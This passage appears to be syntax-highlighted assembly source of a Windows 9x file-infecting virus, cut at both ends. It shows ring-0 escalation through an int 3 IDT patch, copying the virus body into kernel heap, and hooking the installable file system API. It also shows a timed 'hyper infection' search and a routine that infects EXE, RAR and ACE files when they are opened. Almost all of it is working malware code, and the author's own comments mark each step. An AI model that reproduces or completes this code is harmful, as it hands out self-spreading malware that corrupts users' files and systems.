        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">;if you wanna see IDT struc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">;visit &gt;z0mbie2.asm&lt; for more</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">gs</span><span class="sc0">          </span><span class="sc1">;informations</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">fs</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">;go to ring-0 !!</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc0">          </span><span class="sc1">;make SoftICE well...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">gs</span><span class="sc0">          </span><span class="sc1">;this was fucking bug !</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">

    </span><span class="sc5">jump_host</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;do all appz well...</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__iluzo_return_1</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;find "g_iluzo_return" text</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;in this file for more infoz</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ new int #3 function ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">my_idt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">               </span><span class="sc1">;save all regz and flagz</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_idt</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">;restore int3 descriptor form</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_idt</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;this byte should be zero</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">               </span><span class="sc1">;is there zero or not ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">my_idt_out</span><span class="sc0">      </span><span class="sc1">;it's already resident</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">mem_size</span><span class="sc0">        </span><span class="sc1">;size of this virus in memory</span><span class="sc0">
        </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMGR_GetHeap</span><span class="sc0">      </span><span class="sc1">;alloc memory</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;get dword from stack to ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">mem_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">file_size</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;edi=new destination</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;save it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">;source of virus body</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">;copy virus</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">api_hook</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;hook API function</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMGR_InstallFileSystemApiHook</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">;put last EAX from stack</span><span class="sc0">
                        </span><span class="sc1">;instead check result</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">api_hook_prev</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;prev API hook</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">Archive_Filename_Sz</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">search_start</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">search_finished</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">my_idt_out</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

    </span><span class="sc5">__iluzo_return_2</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;find "g_iluzo_return" text</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;in this file for more infoz</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ hook API functionz ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">api_hook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">;C calls rules</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc5">get_base</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">            </span><span class="sc1">;get address to ebx</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">in_ifs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">api_hook_quit</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">in_ifs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">;***    active my hyper infection ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">search_finished</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">api_hook_next</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;every three second run</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;my hyper infection; I must</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;get time other appz</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">;every three second...</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">           </span><span class="sc1">;divided by three ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">api_hook_next</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">init_search</span><span class="sc0">     </span><span class="sc1">;hyper infication !</span><span class="sc0">

    </span><span class="sc5">api_hook_next</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">._function</span><span class="sc4">,</span><span class="sc5">IFSFN_OPEN</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">api_hook_exit</span><span class="sc0">

    </span><span class="sc5">api_hook_action</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;edi = filename buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">._drive</span><span class="sc0">    </span><span class="sc1">;drive</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">api_hook_exit</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">api_hook_exit</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;convert to letter</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">
        </span><span class="sc6">jl</span><span class="sc0">  </span><span class="sc5">api_hook_exit</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">  </span><span class="sc5">api_hook_exit</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;drive letter first</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">._codepage</span><span class="sc0"> </span><span class="sc1">;BCS_WANSI/BCS_OEM</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">filename_size</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">;max name length</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">._ioreq_ptr</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]+</span><span class="sc2">0Ch</span><span class="sc0">       </span><span class="sc1">;filename</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;uni-str</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;output-str</span><span class="sc0">
        </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMGR_UniToBCSPath</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">         </span><span class="sc1">;remove from stack</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;ASCIIZ</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_file</span><span class="sc0">

</span><span class="sc5">api_hook_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">in_ifs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">api_hook_quit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;prepare to jump back</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">api_hook_prev</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">12345678h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;go to last API func.</span><span class="sc0">

</span><span class="sc5">api_hook_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">leave</span><span class="sc0">               </span><span class="sc1">;SP&lt;-BP, POP BP</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;jump back !</span><span class="sc0">

    </span><span class="sc5">__iluzo_return_3</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;find "g_iluzo_return" text</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;in this file for more infoz</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ main function for infect file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc5">get_base</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'X\:D'</span><span class="sc0">        </span><span class="sc1">;infect files only in my</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infect_file_exit</span><span class="sc0">    </span><span class="sc1">;special directory</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">          </span><span class="sc1">;search this char</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">filename_size</span><span class="sc0">    </span><span class="sc1">;max filename_size</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">           </span><span class="sc1">;searching...</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;set to that char</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;check again !</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infect_file_exit</span><span class="sc0">    </span><span class="sc1">;shit, bad last char</span><span class="sc0">

    </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;you can infect only</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'DCBA'</span><span class="sc0">      </span><span class="sc1">;this file on my disk</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infect_file_exit</span><span class="sc0">    </span><span class="sc1">;i won't risk</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">;my S-ICE breakpoint</span><span class="sc0">

        </span><span class="sc5">get_base</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">            </span><span class="sc1">;where we're to ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc0">        </span><span class="sc1">;attrib</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ffindfirst</span><span class="sc0">      </span><span class="sc1">;get dta structure</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">infect_file_exit</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ffindclose</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get ext of file</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'EXE.'</span><span class="sc0">      </span><span class="sc1">;is it EXE file ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_ext_1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_ACE_RAR</span><span class="sc0">      </span><span class="sc1">;is it ACE/RAR EXE-SFX file ?</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">infect_file_exit</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_ext_end</span><span class="sc0">
    </span><span class="sc5">next_ext_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'ECA.'</span><span class="sc0">      </span><span class="sc1">;is it ACE archive file ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_ext_2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_ACE_RAR</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infect_file_exit</span><span class="sc0">
    </span><span class="sc5">next_ext_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'RAR.'</span><span class="sc0">      </span><span class="sc1">;is it RAR archive file ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infect_file_exit</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_ACE_RAR</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infect_file_exit</span><span class="sc0">
    </span><span class="sc5">next_ext_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta.dta_filesize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">infect_minsize</span><span class="sc0">  </span><span class="sc1">;is filesize smaller ?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">infect_file_exit</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">infect_maxsize</span><span class="sc0">  </span><span class="sc1">;is filesize bigger ?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">infect_file_exit</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">          </span><span class="sc1">;set attribs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fsetattr</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">infect_file_exit</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fopen</span><span class="sc0">           </span><span class="sc1">;open file !</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">infect_file_restattr</span><span class="sc0">
